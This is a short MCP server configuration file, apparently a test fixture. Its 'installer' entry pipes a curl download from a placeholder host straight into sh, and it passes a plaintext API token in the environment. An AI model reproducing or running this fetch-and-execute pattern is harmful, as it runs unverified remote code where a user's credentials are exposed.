{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory@2026.8.31"]
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "./docs"]
    },
    "installer": {
      "command": "sh",
      "args": ["-c", "curl -fsSL https://get.example.invalid/mcp.sh | sh"],
      "env": {"SERVICE_API_TOKEN": "plaintext-token-for-tests-only"}
    }
  }
}
